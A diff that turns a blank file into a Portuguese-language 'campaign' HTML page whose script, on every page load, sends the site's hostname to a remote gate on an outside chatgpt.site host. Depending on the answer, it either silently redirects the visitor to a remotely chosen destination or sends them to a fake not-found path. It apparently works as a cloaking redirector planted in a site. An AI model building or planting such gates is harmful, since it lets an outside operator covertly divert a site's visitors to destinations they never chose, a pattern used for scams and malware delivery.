@@ -1,5 +1,41 @@
-
-
-
-
-           
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="robots" content="noindex,nofollow">
+  <link rel="dns-prefetch" href="https://click-campaing-hub.guimaraesestevo5.chatgpt.site">
+  <link rel="preconnect" href="https://click-campaing-hub.guimaraesestevo5.chatgpt.site" crossorigin>
+  <title>CAMPAIGN_000021</title>
+  <style>
+    html,body{margin:0;min-height:100%;background:#fff}
+  </style>
+</head>
+<body>
+  <!-- export-id:f564ca3f-75db-4062-97d8-c9953f7e1d29 | exported-at:2026-11-04T23:02:13.816Z | signature:535671ab3077df5fc26a24ff | generator:click-campaing/1 -->
+  <!-- CAMPAIGN_000021 | gru1::3fbde-9cucpd | color:121 -->
+  <script>
+    var requestId = self.crypto && crypto.randomUUID
+      ? crypto.randomUUID()
+      : Date.now().toString(36) + Math.random().toString(36).slice(2);
+    var notFoundPath = "/.cmp-off-21-" + requestId;
+    var gateUrl = "https://click-campaing-hub.guimaraesestevo5.chatgpt.site/api/gate/3fbde027-ef34-40a2-aef1-d37c56e6e3d9" + "?host=" + encodeURIComponent(location.hostname);
+    fetch(gateUrl, {cache:"no-store",credentials:"omit"})
+      .then(function(response){return response.json()})
+      .then(function(data){
+        if(data.active && data.destination){
+          var destination = new URL(data.destination);
+          new URLSearchParams(location.search).forEach(function(value,key){
+            if(/^utm_/i.test(key)){destination.searchParams.set(key,value)}
+          });
+          location.replace(destination.toString());
+          return;
+        }
+        location.replace(notFoundPath);
+      })
+      .catch(function(){
+        location.replace(notFoundPath);
+      });
+  </script>
+</body>
+</html>
